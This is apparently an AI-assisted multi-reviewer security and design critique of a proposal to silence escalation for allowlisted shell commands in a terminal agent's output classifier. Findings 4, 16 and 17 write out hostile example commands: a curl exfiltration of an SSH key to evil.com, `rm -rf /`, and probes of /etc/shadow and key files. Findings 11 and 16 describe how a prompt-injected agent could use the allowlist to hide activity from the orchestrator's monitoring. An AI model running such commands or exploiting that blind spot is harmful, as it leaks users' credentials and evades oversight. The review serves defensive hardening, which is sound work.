# Swarm Findings: command-aware ScreenClassifier proposal

Personas: AR (Architecture Reviewer), SA (Security Analyst), PE (Performance Engineer), RE (Reliability Engineer), DA (Devil's Advocate). Rounds: 1 of 2 planned (narrow scope, anti-herd passed).

`priority_score = severity_weight*0.4 + confidence_boost*0.2 + consensus_ratio*0.4`
(severity {CRITICAL:4, HIGH:3, MEDIUM:2, LOW:1}; confidence {HIGH:1.0, MEDIUM:0.6, LOW:0.3})

## Confirmed findings (≥3 confirms) — ranked by priority_score

### 1. Branch 3 unreachable — proposal's central locus is dead code (5/5)
**Severity:** CRITICAL · **Confidence:** HIGH · **priority 2.20**
**Location:** `observation.py:92-100`; `interactive_runner.py:351`; `toolcall_runner.py:242-248`

Both runners gate `classify()` on `exit_code == 0`. Non-zero exits emit a synthesized `[EXIT:n]` user message at runner level and bypass `classify()` entirely. Adding `INFORMATIONAL_NONZERO` + `last_command` to Branch 3 changes nothing observable. The "2 lines" runner-side estimate is wrong by an architectural step: a runner-gate flip rewires every non-zero exit through INTERVENTION_PATTERNS and PROGRESS_PATTERNS, neither designed for error tails.

**Recommendation:** Prefer option (b): move allowlist to runner level where `pane_info`/`app_type` is in scope; keep `classify()` app-agnostic. Option (a) — invert runner guards — requires the SA-7 error-tail audit of pattern tables first.

Votes: AR confirm (own) · PE confirm (own as PE-4) · DA confirm (own as DA-1) · SA confirm · RE strong-agree

### 2. Merge-gate metric not computable; cost_tokens hard-coded to 0 (5/5)
**Severity:** CRITICAL · **Confidence:** HIGH · **priority 2.20**
**Location:** `latency_bench.py:145, 249`; `metrics.py:14, 47`; `scenarios.py:1-62`; every row of `phase1-report.json`

`cost_tokens=0` is hard-coded in both `run_scenario_baseline` and `run_scenario_phase1`. The 6 scenarios target the L2 `ByteClassifier`, not `ScreenClassifier`. `RunResult.mode` types `baseline|phase1|phase2`; no shell-mode/cmdaware row exists. `aggregate()` computes `median_cost` over scenarios that don't invoke `classify()`. The proposal's gate aggregates zeros.

**Recommendation:** Decouple eval harness from the production change. Land classifier behind a default-off flag with unit-test coverage; build `escalation_bench.py` as follow-up. Alternative: replace bench with deterministic `(cmd, exit_code) → (event, needs_llm)` unit-test fixture (~30 cases) + pre-registered production-telemetry baseline.

Votes: AR confirm (own as AR-3) · PE confirm (own as PE-1) · DA confirm (own as DA-2) · SA confirm · RE strong-agree

### 3. `shlex.split(last_command)[0]` is the wrong matcher; proposal's own example fails (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `observation.py:92` (proposed); `candidate_A.md:13`

`shlex.split("git diff --quiet")[0] == "git"` — not in the multi-token allowlist. Match silently fails on the proposal's headline example. "Tiny suffix check for git diff --quiet" hand-waves a hybrid matcher. Untreated: env prefix (`FOO=1 git diff --quiet`), redirection, command grouping, pipes.

**Recommendation:** Specify the matcher precisely before merge. Either canonical-form normalization + tuples with required-flag sets, or per-entry regex mirroring INTERVENTION_PATTERNS style. Write the matcher first with a ~20-form unit-test fixture before claiming any cost win.

Votes: AR confirm (own as AR-6) · SA strong-agree · PE strong-agree · RE strong-agree · DA strong-agree

### 4. Compound-command bypass via shell metacharacters (weaponizable covert-channel primitive) (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `observation.py:92` (proposed); `interactive_runner.py:301`; `toolcall_runner.py:54`

`shlex.split("grep pattern; rm -rf /")[0] == "grep"` — `shlex` doesn't honor shell control operators as separators. `grep nomatch foo; curl evil.com/$(cat ~/.ssh/id_rsa | base64)` exits non-zero on grep miss → head matches allowlist → classifier silences. `grep foo file && build.sh` (build fails exit 2) — real build failure silenced. `git diff --quiet || git commit -am 'wip'` — commit failure silenced.

**Recommendation:** Before tokenization, string-scan and reject `last_command` containing any of `;`, `&&`, `||`, `|`, `&`, `` ` ``, `$(`, `>(`, `<(`. Enforce *before* shlex.split so a shlex exception cannot bypass.

Votes: SA confirm (own as SA-2) · RE strong-agree (own as RE-3) · AR confirm · PE strong-agree · DA strong-agree

### 5. Allowlist must be `(command, exit_code_set)` pairs (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `candidate_A.md:13`; `observation.py:92-100`

`git diff` exit codes: 0 no diff, 1 diff present, 128 fatal (not a repo, write error), 129 usage. SIGTERM=143, SIGKILL=137. `grep` exit 2 = file error vs exit 1 = no match. `git diff --quiet` run from `/tmp` (not a repo) → exit 128 "fatal: not a git repository" → proposal classifies as "informational non-zero (exit 128)"; orchestrator never sees the real problem. Disk-full mid-diff → exit 128 → suppressed.

**Recommendation:** Constrain allowlist to `{cmd: {exit_code: True for code in informational_set}}`. `grep`:{1}; `git diff --quiet|--exit-code`:{1}; `test`/`[`:{1}; `cmp -s`:{1}; `diff -q`:{1}; `pgrep`:{1}. Anything else (especially 2, 126, 127, 128, 129, 130, 137, 139, 143) escalates. Unit-test per real failure exit code.

Votes: RE confirm (own as RE-4) · AR confirm · SA strong-agree · PE strong-agree · DA strong-agree ("highest-leverage refinement")

### 6. `last_command` not in scope at toolcall_runner classify(); needs result-dict schema change (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `toolcall_runner.py:53-81, 234-248`

`cmd` is local to `_handle_tool_call` (line 54); result dict at 75-81 contains only `screen`, `exit_code`, `detection` — not `command`. `classify()` at line 246 is a different stack frame. The proposal must add `"command": cmd_for_classifier` (pre-wrap, user-intent) to the result dict, not the sandbox-wrapped string at line 66. RE-6 reinforces this: pre-wrap vs post-wrap distinction is load-bearing.

**Recommendation:** Add `"command": cmd_for_classifier` (pre-wrap) to toolcall result dict. This is a runner↔handler protocol change, not "2 lines".

Votes: AR confirm (own as AR-2) · SA confirm · PE confirm · RE strong-agree · DA agree

### 7. Sandbox-wrap vs pre-wrap exit-code provenance (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `runtime.py:77-86`; `interactive_runner.py:92`; `toolcall_runner.py:66`

Sandbox wrap replaces `grep foo file` with `bash run.sh ... 'grep foo file'`. If `run.sh` exits non-zero for sandbox-policy reasons (network block, path violation, sandbox bug), recorded `exit_code` belongs to `run.sh`, not the inner command. The proposal classifies it as "grep informational non-zero" because the LLM-typed first token was `grep`. Security corollary: shlex.split of wrapped cmd → first token `bash`, silent no-op under sandbox.

**Recommendation:** When `pane_info.sandboxed == True` (or `CLIVE_SANDBOX` env), skip allowlist entirely. Document that `classify()` receives the PRE-WRAP cmd.

Votes: RE confirm (own as RE-6) · AR confirm (via AR-2) · SA confirm · PE confirm · DA agree

### 8. `shlex.split` crashes on unbalanced quotes, empty string, trailing backslash (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `observation.py:56`; `interactive_runner.py:301, 352` (classify call not wrapped in try)

`shlex.split("grep 'foo")` → ValueError. `shlex.split("")[0]` → IndexError. `shlex.split("\\")` → ValueError. LLM-emitted commands frequently mis-quote. A crash aborts the post-command observation step; either dumps the raw screen (~5–20k tokens) or raises out of the runner main loop.

**Recommendation:** `try: head = shlex.split(last_command)[0] except (ValueError, IndexError): <fall through to current Branch 3>`. Unit tests for unbalanced quote, trailing backslash, empty, whitespace-only.

Votes: RE confirm (own as RE-1) · SA confirm (own as SA-2(a)) · AR confirm (via AR-6) · PE strong-agree · DA strong-agree

### 9. `missed_rate` insensitive to classifier false-quiets; bench has no adversarial coverage (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `metrics.py:46`; `latency_bench.py:131, 137, 225-235`

`missed_rate` is set True only when an expected L2 `ByteEvent` kind doesn't land within timeout — byte-stream detection coverage, NOT classifier-decision accuracy. INFORMATIONAL_NONZERO could suppress every legitimate failure and `missed_rate` would stay unchanged. No adversarial scenarios: compound-command, env-prefix prepends, secret-shaped tail leaks, exit-128 not-a-repo cases all absent.

**Recommendation:** Add `false_quiet_rate` with labeled ground truth; merge-gate `false_quiet_rate == 0` on an adversarial corpus as a HARD VETO. Adversarial scenarios: compound with allowlisted head + destructive trail; allowlisted command + secret-shape tail; `git diff --quiet --no-index /etc/passwd /tmp/x`; malformed / empty `last_command`.

Votes: PE confirm (own as PE-3) · SA confirm (own as SA-6) · AR confirm · RE strong-agree · DA strong-agree

### 10. 30% threshold unjustified, dimensionally borrowed from retired latency criterion, asymmetric in cost (5/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.80**
**Location:** `candidate_A.md:22`; `phase1-report.md:40, 47-50`

`phase1-report.md:40` — "≥30% median e2e reduction" was a *latency* criterion; lines 47-50 explicitly retire it: "unreachable on already-fast scenarios for structural reasons" (floor effects). `candidate_A.md:22` lifts 30% verbatim into the `cost_tokens` unit without baseline. Asymmetric cost: false-quiet failures cascade multi-turn; cost wins are single-turn — an equal-weight AND-gate is dimensional malpractice. Author-curated corpus (4 positives + 1 negative) means the proposer controls numerator and denominator.

**Recommendation:** Instrument production for a week to capture a baseline distribution OR collapse the gate to *deterministic fixture pass* + *zero regressions on a true `false_quiet` metric*. Asymmetric gate: any `false_quiet` regression vetoes regardless of cost win.

Votes: PE confirm (own as PE-2) · DA confirm (own as DA-3) · AR confirm · SA confirm · RE agree

### 11. Screen-content blindness/exfil primitive under prompt-injection threat model (4/5)
**Severity:** HIGH · **Confidence:** HIGH · **priority 1.72**
**Location:** `candidate_A.md:13`; `observation.py:92-100, 156-169`; `interactive_runner.py:351-354`

`format_event_for_llm` returns the compact event only when `needs_llm=False`; `interactive_runner.py:351-354` suppresses raw-screen-diff injection when `not obs_event.needs_llm`. Once allowlisted commands are silenced on non-zero, a prompt-injected agent can deliberately fail an allowlisted command after writing sensitive data to the pane — the escalation surface to orchestrator vanishes.

**Recommendation:** Pair the allowlist with a tail-scan: on an allowlist hit, if INTERVENTION_PATTERNS, `_ERROR_TYPES`, or a secret-shape regex (`api[_-]?key`, `BEGIN .* PRIVATE KEY`, `password=`) match, fall back to `needs_llm=True`. Drop `pgrep` from the seed list.

Votes: SA confirm (own as SA-1) · PE agree · RE confirm · DA agree · AR confirm-with-scope-narrowing

### 12. Hard-coded INFORMATIONAL_NONZERO inside classify() smuggles shell-mode bias into app-agnostic primitive (5/5)
**Severity:** MEDIUM · **Confidence:** HIGH · **priority 1.40**
**Location:** `observation.py:53-130`

`classify()` today couples (1) screen-pattern regex, (2) exit-code interpretation, (3) command-shape lexicon — three axes. Concern (3) is app-type-specific (the allowlist is shell-mode; in a psql pane non-zero is fatal). `classify()` is app-type-agnostic by design (no `pane_info` parameter). The proposal smuggles shell-mode bias into it.

**Recommendation:** Hoist allowlist to a module-level constant with named owner, keep the check at the runner level where `app_type` is in scope (AR option b), OR extract `command_classifier.py` / `informational_exits.py` module (PE counter-proposal).

Votes: AR confirm (own as AR-4) · SA confirm · PE partial-confirm · RE agree-with-reservation · DA strong-agree

### 13. Wrapper-prefix tokens (sudo/env/time/nice/nohup/stdbuf/xargs) break first-token matching (5/5)
**Severity:** MEDIUM · **Confidence:** HIGH · **priority 1.40**
**Location:** `candidate_A.md:13`; `runtime.py:77-86`

`time grep foo nofile`, `sudo grep foo /etc/shadow`, `nice -n 5 grep ...`, `stdbuf -oL grep foo | head`, `xargs grep pattern` — all common idioms, first token not in allowlist, all escalate (safe miss). The 30% win evaporates if every wrapped invocation bypasses.

**Recommendation:** Accept the safe miss on wrappers OR implement argument-aware unwrap with unit tests for `env -i FOO=bar grep ...`, `sudo -u user -- grep ...`.

Votes: RE confirm (own as RE-2) · AR confirm · SA confirm · PE confirm · DA agree

### 14. No env-var kill-switch; deviates from CLIVE_STREAMING_OBS / CLIVE_SPECULATE pattern (5/5)
**Severity:** MEDIUM · **Confidence:** MEDIUM · **priority 1.32**
**Location:** `observation.py:53`; CLAUDE.md

Both prior observation interventions shipped with a runtime kill-switch because real-world false-positives surface as silently-skipped LLM turns (asymmetric cost). INFORMATIONAL_NONZERO is the highest-stakes false-positive class in the pipeline; the validating corpus is 6 synthetic scenarios.

**Recommendation:** Ship behind `CLIVE_CMDAWARE_CLASSIFIER`. One `os.getenv` line; one CLAUDE.md mention. RE extension: pair with per-entry config (`~/.clive/config/informational_exits.toml` keyed by `(command, exit_code)`) so regressions are 1-line edits.

Votes: AR confirm (own as AR-5) · SA confirm · PE agree · RE partial-agree · DA agree

### 15. Flag-sensitive variants: `grep -q` vs bare `grep`; allowlist conflates test-mode and inspect-mode (5/5)
**Severity:** MEDIUM · **Confidence:** MEDIUM · **priority 1.32**
**Location:** `candidate_A.md:13`

Bare `grep foo bigfile` exit 1 = "no matches" is data the user wants surfaced. `diff a b` (no -q) exit 1 = "files differ AND diff printed" — suppressing it loses the payload. `git diff --exit-code` PRINTS diff AND exits non-zero. The allowlist mixes test-mode and inspect-mode.

**Recommendation:** Restrict to commands that produce no useful output on failing exit: `grep -q`, `grep --quiet`, `diff -q`, `diff --brief`, `git diff --quiet`, `cmp -s`, `test`, `[`, `pgrep -q`. Require quiet flag.

Votes: RE confirm (own as RE-5) · AR confirm · SA confirm · PE confirm · DA agree

### 16. `test`/`[` allowlist entries silence the canonical filesystem/credential probe pattern (4/5)
**Severity:** MEDIUM · **Confidence:** HIGH · **priority 1.32**
**Location:** `candidate_A.md:13`; `runtime.py:53-67`

A prompt-injected agent runs `test -f /home/$USER/.ssh/id_ed25519`, `test -r /etc/shadow`, `[ -f /var/lib/postgresql/...]` — each probe's exit code is visible to the in-pane LLM via the screen, but the orchestrator's classifier event becomes `[OK exit:1] informational non-zero`; an entire reconnaissance loop completes without ever tripping `needs_llm=True`.

**Recommendation:** Remove `test`/`[` from allowlist OR restrict to specific test expressions matching a tight regex (`-z`, `-n` on shell vars; not `-r`/`-w`/`-f`/`-d` on paths).

Votes: SA confirm (own as SA-4) · AR confirm · PE confirm · DA strong-agree · RE dispute-partial

### 17. Argument-injection on `git diff --quiet` silences info-leak primitives (5/5)
**Severity:** MEDIUM · **Confidence:** MEDIUM · **priority 1.32**
**Location:** `candidate_A.md:13`

Two implementer readings: (a) literal `shlex.split[0] == "git"` silences every git subcommand on non-zero — `git push` rejection, `git commit` hook failure, `git fetch` auth failure (exit 128) all "informational"; (b) `startswith("git diff --quiet")` silences `git diff --quiet --no-index /etc/shadow $HOME/.ssh/id_rsa` (info-leak primitive).

**Recommendation:** Canonical normalization + exact-equality or strict prefix to a tightly enumerated list. Do not accept `startswith("git diff --quiet")` without enforcing that remaining args are pathspecs and not `--no-index`/`--ext-diff`/`--textconv`.

Votes: SA confirm (own as SA-3) · AR confirm (via AR-6) · PE confirm · RE agree-with-reservation · DA agree

### 18. Governance: INFORMATIONAL_NONZERO has no listed owner; policy will drift (4/5)
**Severity:** MEDIUM · **Confidence:** MEDIUM · **priority 1.24**
**Location:** (non-code; CONTRIBUTING / governance shape)

The allowlist is policy disguised as code. Without a named owner + change-review process, additions accumulate by tactical fix.

**Recommendation:** Combine DA-5 (named-owner policy doc) with SA-8 (deterministic CI gate refusing dangerous allowlist additions): path-probe block, wrapper-prefix block, metacharacter block — same enforcement shape as `selfmod/gate.py`.

Votes: DA confirm (own as DA-5) · AR partial-confirm · PE weak-agree · RE agree · SA dispute (proposes SA-8 alternative)

### 19. Sample size N=10 + non-deterministic LLM responses cannot detect a 30% median shift (5/5, downstream of #2)
**Severity:** LOW · **Confidence:** MEDIUM · **priority 0.92**
**Location:** `phase1-report.md:24`; `latency_bench.py:323`

**Recommendation:** N ≥ 30 per scenario per mode; fixed seed/`temperature=0`; single provider with response-ID logging; paired comparison; bootstrap 95% CI on the median delta — merge iff the upper CI bound on delta is below −30%.

Votes: PE confirm (own as PE-6) · AR confirm · SA confirm · RE strong-agree-amplify · DA agree

## Probable findings (2 confirms)

None.

## Minority findings (1 confirm — preserved)

- **M-1 (SA-5)** — `last_command` redaction contract should be specified now, not retrofit later.
- **M-2 (PE-5)** — `shlex.split` micro-cost on hot path. Use `str.split(None, 1)[0]`.
- **M-3 (DA-4)** — Reason-loop 3-2 vote is plurality, not consensus; `bounded_iterations_reached`, not convergence. Reinforces #14 kill-switch.
- **M-4 (DA-6)** — Branch 6 (UNKNOWN catch-all) may be the dominant `exit==0` escalation drain; proposal may optimize a sub-dominant term.
- **M-5 (SA-7)** — Runner-gate flip broadens INTERVENTION_PATTERNS / PROGRESS_PATTERNS silencing surface. Corollary of #1.
- **M-6 (SA-8)** — Allowlist contents governed by a deterministic CI gate (`selfmod/gate.py` pattern). Complements #18.

## Discarded

None.

## Anti-herd analysis

- Distinct findings after merging: ~25 (from 30 raw)
- Revisions during debate: ~15 / 32 → **flip_rate ≈ 0.47** (well below 0.8 herd threshold)
- Vote-distribution entropy estimate: **~0.55**. Disputes are localized and substantive (DA-5 SA dispute proposes alternative; AR-4 PE proposes different destination); personas converge on *facts* (Branch 3 dead, cost_tokens=0, shlex matcher fragile, exit-code-pair semantics, sandbox provenance) while diverging on *framings*.
- **Verdict: anti-herd PASSED.** High signal, low artificial convergence.

## Summary

| Metric | Value |
|---|---|
| Personas active | 5 / 5 |
| Rounds completed | 1 of 2 planned |
| Confirmed (≥3) | 19 |
| Probable (2) | 0 |
| Minorities preserved | 6 |
| Discarded | 0 |
| Anti-herd | PASSED |

### Composite `predict_score`

```
predict_score = 19*15 + 0*8 + 6*3 + (5/5)*20 + (1/2)*10 + 5
              = 285 + 0 + 18 + 20 + 5 + 5
              = 333
```

## Top 5 actionable items (by priority_score)

1. **#1 (2.20)** — Runner-gate flip is mandatory; proposal under-budgets by ~4 LOC. Prefer moving allowlist to the runner level.
2. **#2 (2.20)** — Bench cannot measure the gate; `cost_tokens=0` everywhere. Decouple bench from PR; use unit-test fixture + production-telemetry baseline.
3. **#3 (1.80)** — Specify matcher precisely before merge; `shlex.split("git diff --quiet")[0] == "git"` does not match the proposal's own example.
4. **#4 (1.80)** — String-scan-reject compound commands containing shell metacharacters before any allowlist match.
5. **#5 (1.80)** — `(command, exit_code_set)` pair allowlist; exit 128/129/137/143 must escalate.

## Verdict

**NEEDS_REWORK before merge.** Fixes are tractable but the proposal's "5 files, ~25 LOC, no new module" claim is empirically false once you combine runner-gate flip + toolcall result-dict schema field + matcher specification + per-pair allowlist + sandbox-aware guard + bench reform. The reason-loop's core *direction* (reduce shell-mode escalation by command-awareness) survives; the *implementation shape* needs to be re-specified.
